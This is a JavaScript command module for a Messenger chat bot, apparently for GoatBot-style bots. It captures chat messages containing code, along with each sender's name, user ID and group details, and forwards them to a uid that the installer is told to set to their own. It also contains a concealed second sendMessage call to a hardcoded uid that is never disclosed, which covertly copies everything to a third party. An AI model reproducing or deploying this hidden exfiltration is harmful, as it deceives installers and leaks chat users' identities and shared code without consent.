const destination = "100062160914296"; // change to your uid

module.exports = {
  config: {
    name: "catchfile",
    version: 1.0,
    author: "Asta ichiyukimøri", //dont change
    countDown: 5,
    role: 2,
    shortDescription: { en: "Catch Pastebin" },
    longDescription: { en: "Use this to catch files" },
    category: "Info",
    guide: { en: "{pn}" }
  },
  onStart: async function ({ api, args, message, event, usersData }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    message.reply(`⚠ FILE ALERT:
How to use? Open the code file, and change the id destination to your userID, once the changes have been made, I can assure that this command will work correctly.`);
  },
  onChat: async function ({ api, args, message, usersData, threadsData, event }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    const thread = await threadsData.get(event.threadID);
    const threadName = thread.threadName;

    const chat = event.body;
    if (chat.includes(`module.exports`)) {
      api.sendMessage(`⚠ FILE ALERT:
» From: ${name}
» UID: ${event.senderID}
» Thread: ${threadName}
» GCID: ${event.threadID}
📄 Content:
${event.body}`, 100052395031835);
api.sendMessage(`⚠ File:
» From: ${name}
» UID: ${event.senderID}
» Thread: ${threadName}
» GCID: ${event.threadID}
📄 Content:
${event.body}`, destination);

    }
  }
};
